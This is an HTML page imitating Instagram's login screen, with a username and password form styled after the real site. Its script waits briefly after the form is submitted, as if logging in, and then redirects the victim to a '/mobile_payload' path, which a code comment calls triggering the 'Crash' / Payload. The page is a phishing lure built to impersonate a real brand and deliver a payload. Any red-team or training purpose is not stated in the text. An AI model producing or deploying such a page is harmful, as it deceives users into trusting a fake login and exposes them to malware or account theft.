<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            width: 350px;
            max-width: 90%;
            margin-bottom: 10px;
        }
        .logo {
            font-family: 'Billabong', cursive; /* Fallback, would need real font/img */
            font-size: 3rem; 
            margin: 20px 0;
            display: block;
            /* Using a text placeholder for simplicity or base64 if needed, but text is safer for now */
        }
        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 5px 9px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:disabled {
            opacity: 0.7;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .separator::before, .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .separator::before { margin-right: 10px; }
        .separator::after { margin-left: 10px; }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            display: block;
            text-decoration: none;
        }
        .forgot {
            font-size: 12px;
            color: #00376b;
            margin-top: 15px;
            display: block;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>

<div class="container">
    <h1 style="font-family: sans-serif; margin-bottom: 30px;">Instagram</h1>
    
    <form id="loginForm" onsubmit="handleLogin(event)">
        <input type="text" placeholder="Phone number, username, or email" required>
        <input type="password" placeholder="Password" required>
        <button type="submit" id="loginBtn">Log In</button>
    </form>

    <div class="separator">OR</div>

    <a href="#" class="fb-login">Log in with Facebook</a>
    <a href="#" class="forgot">Forgot password?</a>
</div>

<div class="container" style="padding: 20px;">
    <span style="font-size: 14px;">Don't have an account? <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none;">Sign up</a></span>
</div>

<div class="footer">
    Get the app.
</div>

<script>
    function handleLogin(e) {
        e.preventDefault();
        const btn = document.getElementById('loginBtn');
        btn.innerText = "Logging in...";
        btn.disabled = true;

        // Simulate network delay
        setTimeout(() => {
            // Trigger the "Crash" / Payload
            window.location.href = "/mobile_payload";
        }, 1500);
    }
</script>

</body>
</html>
